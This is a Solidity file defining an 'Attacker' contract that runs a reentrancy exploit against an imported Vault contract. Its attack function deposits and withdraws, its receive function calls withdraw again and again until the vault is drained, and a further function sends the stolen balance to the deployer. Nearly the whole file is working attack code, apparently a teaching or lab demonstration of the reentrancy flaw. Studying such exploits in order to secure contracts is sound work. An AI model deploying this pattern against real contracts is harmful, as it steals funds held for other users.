// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";

contract Attacker {
    Vault public vault;
    address public owner;

    constructor(address _vault) {
        vault = Vault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
    require(msg.value >= 0.0001 ether, "Need at least 0.0001 ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 0.0001 ether) {
            vault.withdraw(); // re-enter withdraw recursively
        }
    }

    function withdrawToOwner() public {
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
